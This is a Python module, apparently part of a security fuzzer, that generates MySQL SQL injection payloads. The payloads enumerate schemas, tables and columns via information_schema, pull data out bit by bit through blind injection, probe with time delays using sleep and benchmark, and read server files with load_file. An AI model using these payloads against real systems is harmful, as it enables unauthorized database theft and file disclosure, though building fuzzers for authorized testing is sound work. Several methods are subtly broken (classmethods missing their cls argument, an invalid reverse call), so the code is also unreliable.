#!/usr/bin/env python
# -*- coding: utf-8 -*-

import random


from saker.fuzzers.sqli import SQLi


class MySQLi(SQLi):

    strFunc = [
        'mid(%s,1,1)',
        'substr(%s,1,1)',
        'substring(%s,1,1)',
        'lpad(%s,1,1)',
        'rpad(%s,1,1)',
        'left(%s,1)',
        'right(%s,1)',
        'reverse(%s,1)',
    ]

    @classmethod
    def version(cls):
        return "version()"

    @classmethod
    def schemas(cls, bias=-1):
        # todo
        # add innodb_table_stats
        payload = "select distinct(SCHEMA_NAME) from information_schema.SCHEMATA"
        if bias >= 0:
            payload += " limit %s,1" % bias
        else:
            payload += " limit 1"
        return payload

    @classmethod
    def tables(cls, schema="", bias=-1):
        payload = "select distinct(TABLE_NAME) from information_schema.TABLES"
        if schema:
            payload += " where TABLE_SCHEMA='%s'" % schema
        if bias >= 0:
            payload += " limit %s,1" % bias
        else:
            payload += " limit 1"
        return payload

    @classmethod
    def columns(cls, schema="", table="", bias=-1):
        payload = "select distinct(COLUMN_NAME) from information_schema.COLUMNS"
        if schema:
            payload += " where TABLE_SCHEMA='%s'" % schema
        if table:
            if schema:
                payload += " and TABLE_NAME='%s'" % table
            else:
                payload += " where TABLE_NAME='%s'" % table
        if bias >= 0:
            payload += " limit %s,1" % bias
        return payload

    @classmethod
    def sub(cls, payload, pos, mid):
        return "(ascii(mid((%s),%s,1))&%d)" % (payload, pos, mid)

    @classmethod
    def char(cls, c):
        return 'char(%s)' % c

    @classmethod
    def ascii(cls, c):
        return 'ascii(%s)' % c

    @classmethod
    def delay(cls):
        payload = [
            'sleep(3)',
            'benchmark(count, expr)'
        ]
        return payload

    @classmethod
    def readfile(filename):
        return 'load_file(%s)' % filename

    @classmethod
    def offset(limit, offset):
        return 'limit %s, %s' % (limit, offset)
